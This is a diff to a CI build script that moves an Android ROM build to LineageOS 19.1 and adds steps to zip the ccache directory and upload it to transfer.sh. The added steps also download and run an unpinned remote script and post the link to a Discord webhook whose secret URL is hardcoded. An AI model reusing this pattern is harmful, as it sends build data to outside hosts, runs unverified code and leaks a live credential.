@@ -1,13 +1,22 @@
 # sync rom
-repo init --depth=1 --no-repo-verify -u git://github.com/DerpFest-11/manifest.git -b 11 -g default,-mips,-darwin,-notdefault
-git clone https://github.com/pocox3pro/Local-Manifests.git --depth 1 -b master .repo/local_manifests
+repo init --depth=1 --no-repo-verify -u https://github.com/LineageOS/android.git -b lineage-19.1 -g default,-mips,-darwin,-notdefault
+git clone https://github.com/flame-0/manifest.git --depth 1 -b master .repo/local_manifests
 repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j8
 
 # build rom
 source build/envsetup.sh
-lunch derp_vayu-user
+lunch lineage_alioth-userdebug
 export TZ=Asia/Dhaka #put before last build command
-mka derp
+make bacon
+
+# upload generated cache
+wu='https://discord.com/api/webhooks/1017821133959077978/fYenpQNVuMZEfm9G5nctsH7prarMgNZA-l_J7eti5HvQJkG2PEKicaY3Qs3uFhMMuSju'
+zip amogus.zip -r "$CCACHE_DIR"
+apt install -y wget
+amogus="$(wget --method PUT --body-file=amogus.zip https://transfer.sh/amogus.zip -O - -nv)"
+wget https://raw.githubusercontent.com/ChaoticWeg/discord.sh/master/discord.sh
+chmod +x discord.sh
+./discord.sh --webhook-url $wu --text "<:dnd:546871193282674703> impostor detected. $amogus"
 
 # upload rom (if you don't need to upload multiple files, then you don't need to edit next line)
 rclone copy out/target/product/$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1)/*.zip cirrus:$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1) -P
